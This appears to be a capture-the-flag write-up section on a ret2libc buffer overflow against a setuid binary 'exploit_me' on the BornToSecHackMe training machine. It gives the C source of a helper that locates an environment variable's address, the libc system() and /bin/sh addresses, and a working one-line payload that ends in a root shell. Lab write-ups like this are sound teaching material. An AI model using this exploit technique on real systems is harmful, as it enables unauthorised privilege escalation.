## Path 3 - Buffer overflow using ret2libc strategy
**Refer path 1 on getting password to zaz**

My first step is to locate the address of the `system()` libC function so I created a dummy.c with the contents like below

```clike=
int main()
{ system(); }
```
I then compile and launch the source with GDB  and printed out the `system` symbol information. The address of the `system` function is `0xb7e6b060`
![image](https://hackmd.io/_uploads/Hy3Cp4u46.png)

After that, I created an env variable to store the string argument `/bin/sh` for our `system()` function. I also made a binary to ease the use of getting an address of a environment variable for us. The reason we also needed to provide the program name as argument when predicting the env address is because the program name affects the beginning of the envp pointer.

```clike=
// getenv.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
         }
        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
}
```

```
zaz@BornToSecHackMe:~$ ./getenv BINSH ./exploit_me
BINSH will be at 0xbfffff41
zaz@BornToSecHackMe:~$

```

The way libC function gets called and reads arguments is through the contents in the stack and it looks like this
![image](https://hackmd.io/_uploads/r1hFZBdNp.png)


our BINSH variable is at `0xbfffff41`. After we get this information, we can construct a payload that 
1. Overflows until return address
2. Replace return address with libC system() address `0xb7e6b060`
3. Append any address because we dont need it returning to anywhere `BEEF`
4. Append our first argument `0xbfffff41`

To sum it in a one liner, it looks something like this
```
./exploit_me `python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "BEEF" + "\x41\xff\xff\xbf"'`
```

And we are now root.
![image](https://hackmd.io/_uploads/BkDaHr_46.png)